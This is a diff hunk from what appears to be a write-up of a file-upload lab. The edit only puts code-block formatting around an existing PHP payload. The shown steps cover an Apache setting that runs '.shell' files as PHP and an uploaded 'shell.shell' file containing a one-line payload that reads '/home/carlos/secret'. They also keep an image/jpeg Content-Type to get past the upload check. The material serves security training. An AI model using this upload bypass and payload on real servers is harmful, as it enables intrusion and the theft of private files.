@@ -31,9 +31,10 @@ This instructs Apache to treat files with the ".shell" extension as PHP scripts.
 shell.shell
 
 7. The file contained the following PHP payload:
-
+   
+```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
-
+```
 I kept the Content-Type as:
 
 Content-Type: image/jpeg
